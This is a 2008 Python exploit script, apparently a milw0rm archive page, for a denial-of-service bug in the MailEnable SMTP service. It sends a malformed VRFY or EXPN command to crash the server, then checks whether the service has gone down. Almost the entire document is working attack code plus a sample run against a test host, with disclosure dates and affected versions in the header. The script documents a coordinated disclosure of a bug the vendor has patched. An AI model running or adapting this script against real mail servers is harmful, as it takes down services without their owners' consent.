<html><head><title>MailEnable SMTP Service VRFY/EXPN Command Buffer Overflow DoS</title></head><pre>#!/usr/bin/python
##########################################################################
#
# MailEnable SMTP Service VRFY/EXPN Command Buffer Overflow ( DoS ) 
# Bug discovered by Matteo Memelli aka ryujin 
# http://www.gray-world.net http://www.be4mind.com
#
# Affected Versions : Standard Edition all versions
#                     Professional Edition all versions
#                     Enterprise Edition all versions
# Tested on OS      : Windows 2000 SP4 English
#                     Windows 2003 Standard Edition Italian
#                     Windows XP SP2 English
# Discovery Date               : 02/24/2008
# Initial vendor notification  : 03/06/2008
# Coordinated public disclosure: 03/11/2008
#
# CONGRATS TO THE MAILENABLE TEAM: VERY FAST IN PATCHING AND ANSWERING!!
#
#-------------------------------------------------------------------------
#
# THX TO muts at offensive-security.com : 
# I'll promise you: next time i'll find an easier one and get my shell :P
#
#-------------------------------------------------------------------------
##########################################################################
#
# matte@badrobot:~$ ./mailenable_smtp.py -H 192.168.1.245 -P 25 -c VRFY
# [+] Connecting to 192.168.1.245 on port 25
# 220 test.local ESMTP MailEnable Service, Version: 0-3.13- ready at \
# 03/06/08 13:20:49
#
# [+] Sending evilbuffer...
# [+] Waiting 10 secs before reconnecting...
# [+] Reconnecting...
# [+] SMTP Server died!
# [+] Connection refused
#
##########################################################################
 
from socket import *
from optparse import OptionParser
import sys, time

usage =  &quot;%prog -H TARGET_HOST -P TARGET_PORT [-c COMMAND]&quot;
parser = OptionParser(usage=usage)
parser.add_option(&quot;-H&quot;, &quot;--target_host&quot;, type=&quot;string&quot;,
                  action=&quot;store&quot;, dest=&quot;HOST&quot;,
                  help=&quot;Target Host&quot;)
parser.add_option(&quot;-P&quot;, &quot;--target_port&quot;, type=&quot;int&quot;,
                  action=&quot;store&quot;, dest=&quot;PORT&quot;,
                  help=&quot;Target Port&quot;)
parser.add_option(&quot;-c&quot;, &quot;--command&quot;, type=&quot;string&quot;,
                  action=&quot;store&quot;, dest=&quot;COMMAND&quot;,
                  help=&quot;Command: VRFY or EXPN ; defualt VRFY&quot;)
(options, args) = parser.parse_args()
HOST    = options.HOST
PORT    = options.PORT
COMMAND = options.COMMAND
if not (HOST and PORT):
   parser.print_help()
   sys.exit()
if not COMMAND:
   COMMAND = 'VRFY'
   print &quot;[+] Using default command VRFY&quot;
else:
   COMMAND = COMMAND.upper().strip()
   if COMMAND != 'VRFY' and COMMAND != 'EXPN':
      print 'Invalid command &quot;%s&quot; Choose between VRFY or EXPN!' % COMMAND
      sys.exit()
evilbuf = '%s \nSMTPISGONNADIE\r\n' % COMMAND
s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
print &quot;[+] Connecting to %s on port %d&quot; % (HOST, PORT)
print s.recv(1024)
print &quot;[+] Sending evilbuffer...&quot;
s.send(evilbuf)
s.close()
print &quot;[+] Waiting 10 secs before reconnecting...&quot;
time.sleep(10)
try:
   s = socket(AF_INET, SOCK_STREAM)
   print &quot;[+] Reconnecting...&quot;
   s.connect((HOST, PORT))
except error, e:
   print &quot;[+] SMTP Server died!&quot;
   print &quot;[+] %s&quot; % e[1]
else:
   print &quot;[-] SMTP Server is still up&quot;
   print &quot;[-] This probably means that is not vulnerable&quot;
   s.close()

# milw0rm.com [2008-03-11]</pre></html>